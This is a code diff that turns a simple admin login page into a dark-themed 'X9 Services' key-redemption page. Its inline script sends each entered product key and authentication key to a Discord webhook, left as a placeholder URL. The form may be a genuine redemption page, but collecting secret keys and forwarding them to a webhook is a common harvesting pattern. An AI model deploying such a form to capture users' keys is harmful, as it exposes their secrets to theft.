@@ -1,36 +1,106 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Dashboard</title>
-  <link rel="stylesheet" href="styles.css" />
-  <script defer src="script.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>X9 Services - Key Redemption</title>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <header>
-    <h1>Admin Panel</h1>
-    <nav>
-      <a href="#">Home</a>
-      <a href="#">Settings</a>
-      <a href="#">Logout</a>
-    </nav>
-  </header>
+<body class="bg-gray-900 text-white font-sans">
 
-  <main>
-    <section class="form-section">
-      <h2>Login</h2>
-      <form>
-        <label for="username">Username</label>
-        <input type="text" id="username" name="username" />
+  <!-- Navbar -->
+  <div class="flex justify-between items-center bg-gray-800 px-6 py-4 border-b border-gray-700">
+    <h1 class="flex items-center text-blue-400 font-bold text-lg">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/>
+      </svg>
+      X9 Services
+    </h1>
+    <a href="#" class="text-white hover:text-blue-400 flex items-center">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" viewBox="0 0 20 20" fill="currentColor">
+        <path fill-rule="evenodd" d="M10 2a6 6 0 016 6v2h2a2 2 0 012 2v6a2 2 0 01-2 2h-6a6 6 0 01-12 0H2a2 2 0 01-2-2v-6a2 2 0 012-2h2V8a6 6 0 016-6z" clip-rule="evenodd" />
+      </svg>
+      Login
+    </a>
+  </div>
 
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" />
+  <!-- Main Card -->
+  <div class="flex justify-center mt-12">
+    <div class="bg-gray-800 p-10 rounded-2xl shadow-lg w-full max-w-xl text-center">
+      <svg class="mx-auto w-12 h-12 text-blue-400 mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 .552-.224 1.05-.586 1.414A1.994 1.994 0 0110 13c-.552 0-1.05-.224-1.414-.586A1.994 1.994 0 018 11c0-.552.224-1.05.586-1.414A1.994 1.994 0 0110 9c.552 0 1.05.224 1.414.586.362.364.586.862.586 1.414z" />
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 11V5a4 4 0 014-4h4a4 4 0 014 4v6" />
+      </svg>
+      <h2 class="text-3xl font-bold text-blue-400">X9 Services</h2>
+      <p class="text-gray-400 mt-2">Key Management Platform</p>
+      <div class="flex justify-center space-x-6 mt-4">
+        <a href="https://x9services.net/store" class="text-gray-400 hover:text-blue-400">x9services.net/store</a>
+        <a href="https://discord.gg/x9services" class="text-gray-400 hover:text-blue-400">discord.gg/x9services</a>
+      </div>
+    </div>
+  </div>
 
-        <button type="submit">Sign In</button>
-        <p>Don't have an account? <a href="#">Register</a></p>
+  <!-- Redeem Form -->
+  <div class="flex justify-center mt-10">
+    <div class="bg-gray-800 p-8 rounded-2xl shadow-lg w-full max-w-2xl">
+      <h3 class="text-2xl font-bold text-blue-400 mb-6 flex items-center">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 .552-.224 1.05-.586 1.414A1.994 1.994 0 0110 13c-.552 0-1.05-.224-1.414-.586A1.994 1.994 0 018 11c0-.552.224-1.05.586-1.414A1.994 1.994 0 0110 9c.552 0 1.05.224 1.414.586.362.364.586.862.586 1.414z" />
+        </svg>
+        Redeem Your Key
+      </h3>
+      <form id="redeemForm" class="space-y-4">
+        <input type="text" id="productKey" placeholder="ENTER YOUR PRODUCT KEY"
+          class="w-full p-3 rounded-lg bg-gray-700 text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500">
+
+        <input type="text" id="authKey" placeholder="ENTER YOUR AUTHENTICATION KEY"
+          class="w-full p-3 rounded-lg bg-gray-700 text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500">
+
+        <button type="submit"
+          class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-6 rounded-lg transition">
+          Submit
+        </button>
       </form>
-    </section>
-  </main>
+      <p id="responseMsg" class="text-center mt-4 text-gray-400"></p>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("redeemForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      
+      const webhookURL = "YOUR_DISCORD_WEBHOOK_URL";
+      const productKey = document.getElementById("productKey").value;
+      const authKey = document.getElementById("authKey").value;
+
+      if (!productKey || !authKey) {
+        document.getElementById("responseMsg").innerText = "⚠️ Please fill out all fields.";
+        return;
+      }
+
+      const payload = {
+        content: "**New Key Redemption Submission**\n" +
+                 "🔑 Product Key: " + productKey + "\n" +
+                 "🛡️ Authentication Key: " + authKey
+      };
+
+      try {
+        const response = await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          document.getElementById("responseMsg").innerText = "✅ Submitted successfully!";
+        } else {
+          document.getElementById("responseMsg").innerText = "❌ Error submitting data.";
+        }
+      } catch (error) {
+        document.getElementById("responseMsg").innerText = "⚠️ Network error.";
+      }
+    });
+  </script>
+
 </body>
 </html>
